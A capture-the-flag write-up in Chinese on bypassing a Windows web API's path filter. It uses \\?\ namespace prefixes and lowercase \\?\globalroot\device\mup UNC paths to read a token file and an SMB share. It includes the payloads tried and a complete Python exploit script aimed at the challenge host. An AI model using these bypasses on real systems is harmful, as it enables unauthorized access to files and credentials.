# LilacCTF - Path Writeup

## 题目信息
- **名称**: Path
- **类型**: Web / Windows
- **描述**: Win32 → NT Path Conversion Challenge
- **Flag**: `LilacCTF{W1n32_t0_NT_P4th_C0nv3rs10n_M4st3r_2026}`

## 0x01 信息收集

访问目标环境 `http://1.95.51.2:8080/`，首页给出了 API 文档和提示。

API 列表：
- **Stage 1**: `GET /api/diag/read` (参数: `path`) - 读取本地诊断文件
- **Stage 2**: `GET /api/export/read` (参数: `path`, `token`) - 读取导出文件（需要 Token）
- **Info**: `GET /api/info` - 获取系统信息

访问 `/api/info` 得到关键提示：
```json
{
    "data": {
        "challenge": "Path Maze",
        "hints": [
            "Stage 1: Find and read the access token from the system",
            "Stage 2: Use the token to access the backup server",
            "Token location: C:\\token\\access_key.txt",
            "Backup server: 172.20.0.10",
            "Backup server SMB Share name: backup",
            "Flag file: flag.txt"
        ],
        "stages": 2,
        "version": "1.0.0"
    },
    "success": true
}
```

**目标**:
1. 读取 `C:\token\access_key.txt` 获取 Token
2. 使用 Token 访问 SMB 共享 `\\172.20.0.10\backup\flag.txt` 获取 Flag

## 0x02 Stage 1: 获取 Token (本地文件读取)

尝试直接读取文件：
```
GET /api/diag/read?path=C:\token\access_key.txt
```
响应: `403 {"error":"Path validation failed: Path not in allowed directory"}`

### 绕过思路：Win32 Device Namespace

Windows API 支持 `\\?\` 前缀（Win32 File Namespaces），它告诉系统禁用所有字符串解析和规范化，将路径直接发送给文件系统驱动程序。

**Payload**: `\\?\C:\token\access_key.txt`

```http
GET /api/diag/read?path=\\?\C:\token\access_key.txt
```

响应:
```json
{
    "success": true,
    "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...", 
    "content": "ACCESS_KEY:PathMaze2026SecureToken"
}
```

**Stage 1 完成！**

## 0x03 Stage 2: 访问 SMB (UNC 路径绕过)

Stage 2 要求访问远程 SMB 共享：`\\172.20.0.10\backup\flag.txt`

### 尝试过的方法

| Payload | 响应 | 分析 |
|---------|------|------|
| `\\172.20.0.10\backup\flag.txt` | 403 UNC path not allowed | 标准 UNC 被拦截 |
| `\\?\UNC\172.20.0.10\backup\flag.txt` | 403 UNC path not allowed | UNC 关键字被检测 |
| `\\?\GlobalRoot\Device\Mup\172.20.0.10\backup\flag.txt` | 403 NT namespace access not allowed | GlobalRoot 被检测 |
| `\\?\Global\UNC\172.20.0.10\backup\flag.txt` | 403 Path not in allowed directory | 绕过 UNC 检测，但不在白名单 |
| `\\?\D:\flag.txt` | 404 | D 盘在白名单中 |

### 关键发现：大小写敏感性差异

经过测试发现，服务器对黑名单关键字的检测是**大小写敏感**的：

| Payload | 响应 |
|---------|------|
| `\\?\GlobalRoot\Device\Mup\...` | ❌ 403 "NT namespace access not allowed" |
| `\\?\globalroot\device\mup\...` | ✅ 200 成功！ |

### 最终 Payload

```
\\?\globalroot\device\mup\172.20.0.10\backup\flag.txt
```

发送请求:
```http
GET /api/export/read?path=\\?\globalroot\device\mup\172.20.0.10\backup\flag.txt&token=<token>
```

响应:
```json
{
    "content": "LilacCTF{W1n32_t0_NT_P4th_C0nv3rs10n_M4st3r_2026}",
    "size": 50,
    "success": true
}
```

**Stage 2 完成！Flag 获取成功！**

## 0x04 漏洞原理

### Win32 到 NT 路径转换

Windows 内部使用 NT 路径（如 `\Device\HarddiskVolume1\...`），而用户空间使用 Win32 路径（如 `C:\...`）。

`\\?\` 前缀是 Win32 File Namespace 的标识，它：
1. 禁用路径规范化（不解析 `..` 等）
2. 允许访问超长路径（突破 260 字符限制）
3. 可以直接访问 NT 对象管理器命名空间

### MUP (Multiple UNC Provider)

`\Device\Mup` 是 Windows 的网络重定向器设备，负责处理 UNC 路径解析：
- 接收形如 `\\Server\Share\File` 的路径
- 将请求路由到相应的网络文件系统驱动（SMB、NFS 等）

通过 `\\?\GlobalRoot\Device\Mup\Server\Share\File` 可以直接调用 MUP 设备访问网络共享。

### 漏洞成因

1. **服务端过滤缺陷**: 使用大小写敏感的字符串匹配检测 `GlobalRoot`、`Device` 等关键字
2. **Windows 路径解析特性**: NT 对象管理器路径解析是大小写不敏感的
3. **绕过方式**: 使用全小写 `globalroot\device\mup` 绕过黑名单检测，Windows 仍能正确解析

## 0x05 完整 Exploit

```python
import requests

BASE = "http://1.95.51.2:8080"

# Stage 1: Get Token
r = requests.get(f"{BASE}/api/diag/read", params={
    "path": r"\\?\C:\token\access_key.txt"
})
token = r.json()["token"]
print(f"[+] Token: {token}")

# Stage 2: Get Flag (case-sensitivity bypass)
r = requests.get(f"{BASE}/api/export/read", params={
    "path": r"\\?\globalroot\device\mup\172.20.0.10\backup\flag.txt",
    "token": token
})
print(f"[+] Flag: {r.json()['content']}")
```

## 0x06 知识点总结

- **Win32 File Namespaces** (`\\?\`): 禁用路径规范化，绕过限制
- **NT Object Manager Paths**: `\GlobalRoot`, `\Device\Mup` 等内核级路径
- **MUP (Multiple UNC Provider)**: Windows 网络重定向器
- **大小写敏感性差异**: Web 应用大小写敏感 vs Windows 路径大小写不敏感
- **路径验证绕过**: 理解系统路径解析机制是绕过过滤的关键

